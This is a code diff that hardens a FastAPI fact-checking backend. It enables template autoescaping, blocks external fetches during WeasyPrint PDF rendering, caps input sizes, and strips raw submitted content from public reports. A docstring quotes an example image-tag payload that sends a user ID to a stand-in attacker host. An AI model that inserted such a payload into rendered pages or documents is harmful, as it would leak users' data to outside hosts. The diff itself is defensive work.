@@ -4,7 +4,7 @@ from fastapi.responses import StreamingResponse, Response
 from sqlalchemy.ext.asyncio import AsyncSession
 from sqlalchemy import select, desc, func
 from pydantic import BaseModel, Field
-from jinja2 import Environment, FileSystemLoader
+from jinja2 import Environment, FileSystemLoader, select_autoescape
 from app.core.database import get_session
 from app.core.auth import (
     get_current_user,
@@ -69,7 +69,17 @@ router = APIRouter()
 
 # Setup Jinja2 environment for PDF templates
 template_dir = Path(__file__).parent.parent.parent / "templates"
-jinja_env = Environment(loader=FileSystemLoader(str(template_dir)))
+jinja_env = Environment(
+    loader=FileSystemLoader(str(template_dir)),
+    autoescape=select_autoescape(["html", "xml"]),
+)
+
+
+def _block_pdf_network_fetch(url: str, timeout: int = 10, ssl_context=None):
+    """F-SEC-05: block WeasyPrint from fetching external resources at PDF
+    render time. Stops poisoned claim text with `<img src="http://attacker/?u={{user_id}}">`
+    from exfiltrating user data via image fetches."""
+    raise ValueError(f"PDF rendering may not fetch external resources (blocked: {url})")
 
 
 def safe_json_dumps(data: dict) -> str:
@@ -225,10 +235,12 @@ class CreateCheckRequest(BaseModel):
     )
     content: Optional[str] = Field(
         None,
-        description="Claim text (required when input_type is 'text'). Supports both statements and questions.",
+        max_length=10_000,
+        description="Claim text (required when input_type is 'text'). Supports both statements and questions. Capped at 10,000 chars to prevent DoS via oversized inputs.",
     )
     url: Optional[str] = Field(
         None,
+        max_length=2048,
         description="URL to analyse (required when input_type is 'url' or 'video'). HTTPS prefix is added automatically if omitted.",
     )
     file_path: Optional[str] = Field(
@@ -2122,7 +2134,10 @@ async def export_check_pdf(
     try:
         import weasyprint
 
-        pdf_bytes = weasyprint.HTML(string=html_content).write_pdf()
+        pdf_bytes = weasyprint.HTML(
+            string=html_content,
+            url_fetcher=_block_pdf_network_fetch,
+        ).write_pdf()
     except Exception as e:
         logger.error(f"PDF generation failed: {e}")
         raise HTTPException(
@@ -2561,9 +2576,14 @@ async def get_public_check(
     return {
         **base_response,
         # Full check metadata
+        # F-SEC-06: inputContent is intentionally stripped from public report
+        # responses. The raw submitted JSON (text/url/file_path) may contain
+        # PII or sensitive claim text — public reports must only expose the
+        # analysis output, not the original prompt. Opt-in is_public flag is
+        # post-launch work. inputUrl is retained because URLs are less
+        # sensitive than free-text claims.
         "inputType": check.input_type,
         "inputUrl": check.input_url,
-        "inputContent": check.input_content,
         "articleExcerpt": check.article_excerpt,
         "articleDomain": check.article_domain,
         "articleJurisdiction": check.article_jurisdiction,
